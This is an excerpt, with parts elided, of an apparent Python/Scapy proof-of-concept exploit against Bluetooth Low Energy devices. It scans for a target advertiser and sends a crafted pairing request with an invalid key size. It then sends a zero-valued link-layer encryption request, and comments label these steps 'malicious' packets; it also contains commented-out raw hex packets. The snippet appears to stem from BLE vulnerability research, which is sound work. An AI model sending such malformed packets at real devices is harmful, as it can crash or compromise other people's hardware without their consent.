...
while True:
	...
	if data:
		...
		if BTLE_SCAN_RSP in pkt and pkt.AdvA == advertiser_address.lower() and connecting == False:
			...
			# Yes, we're sending raw link layer messages in Python. Don't tell Bluetooth SIG as this is forbidden by them!!!
			...
			pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
				iocap=4, oob=0, authentication=0x05, max_key_size=253, initiator_key_distribution=0x07, responder_key_distribution=0x07)
			driver.send(pairing_req)
			# pairing_req[BTLE_DATA].len=1
			# driver.send(BTLE('7083329a0201070006000103000910070787b87c'.decode('hex'))) # Send the malicius packet (1/2)
			# driver.send(BTLE('7083329a0201070006000103000910070787b87c'.decode('hex'))) # Send the malicius packet (1/2)
			...
			enc_request = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ() # encryption request with 0 values
			driver.send(enc_request) # Send the malicius packet (2/2)
			end_connection = True
